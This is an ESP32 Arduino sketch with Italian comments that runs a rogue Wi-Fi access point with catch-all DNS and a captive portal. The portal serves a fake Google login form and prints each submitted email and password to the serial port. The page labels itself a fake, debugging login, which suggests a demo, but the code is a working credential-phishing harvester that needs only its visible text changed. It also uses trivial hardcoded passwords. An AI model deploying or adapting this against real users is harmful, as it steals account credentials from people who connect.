#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include "BluetoothSerial.h"

// DEVO USARE L'SD PER SALVARMI LE COSE IN MEMORIA

// access point generato dall'esp
char *ssid_esp ="test";
char *psw_esp = "12345678";

char *psw_bluetooth ="1234";

DNSServer dnsServer;
AsyncWebServer httpServer(80);
BluetoothSerial SerialBT;

const char index_html[] PROGMEM= R"rawliteral(
  <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      </head>
    
    <body>
      <h1>GO AWAY, THIS IS A FAKE LOGIN!!!</h1>
      <p>Form used for debugging purpose.</p>
      <form action="/login">
        Your email Google : <input type="email" name="email"></input><br>
        Password : <input type="password" name="password"></input>
        <input type="submit"></input>
      </form>
    </body>
  </html>
)rawliteral";

const char login_html[] PROGMEM=R"rawliteral(
      <html>
      <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      </head>
      <body>        Don't send your data in unsafe logins and public wifi...<br> 
        <a href="/">Turn back</a></body>
      </html>
      )rawliteral";

class CaptiveRequestHandler : public AsyncWebHandler{
  public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}
    
    bool canHandle(AsyncWebServerRequest *request){
      return true; // gestisce tutte le richieste
    }
    void handleRequest(AsyncWebServerRequest *request){
      // questo fa in modo che il server rimandi immediatamente alla pagina iniziale
      request->send_P(200,"text/html",index_html);
    }
};


void setupServerPages(){
  // si setta il comportamento per ogni singola pagina
  httpServer.on("/", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send_P(200,"text/html",index_html);
  });

  httpServer.on("/login",HTTP_GET,[](AsyncWebServerRequest *r){
    String inputEmail="";
    String inputPassword="";

    if (r->hasParam("email")){
      inputEmail=r->getParam("email")->value();
    }
    if (r->hasParam("password")){
      inputPassword=r->getParam("password")->value();
    }

    Serial.println("USER DATA: "+ inputEmail+ " "+ inputPassword);

    r->send(200,"text/html",login_html);
  });


  httpServer.onNotFound([](AsyncWebServerRequest *r){
    r->redirect("/");
  });
}


void setESPLocalNetwork(char* ssid,char* psw,IPAddress accesspoint,IPAddress gateway,IPAddress subnet){
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(accesspoint,gateway,subnet);
  while (!WiFi.softAP(ssid,psw)){
    delay(750);
    Serial.println("...");
  }
  dnsServer.start(53, "*", WiFi.softAPIP());
  httpServer.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  setupServerPages();
  httpServer.begin();
  Serial.println("ESP router IP "+WiFi.softAPIP().toString());
}


void authBLConnection(){
  SerialBT.println("Need a password to access:");
  bool ok=false;
  while (!ok){
    // lettura della stringa
    String psw="";
    while (SerialBT.available()==0){ 
      delay(1000);
    }

    while (SerialBT.available()>0){
      char ch=(char)SerialBT.read();
      psw+=ch;
    }

    psw.trim();
    if (psw==psw_bluetooth){
      ok=true;      
    }
  }
  SerialBT.println("User authenticated");
}

void setup() {
  Serial.begin(115200);
  Serial.println("START");
  while (!SerialBT.begin("ESP32")){
    delay(500);
  }
  authBLConnection();
  setESPLocalNetwork(ssid_esp,psw_esp,IPAddress(8,8,8,8), IPAddress(8,8,8,8), IPAddress(255,255,255,0));
}

void loop() {
  dnsServer.processNextRequest();
  delay(20);
}
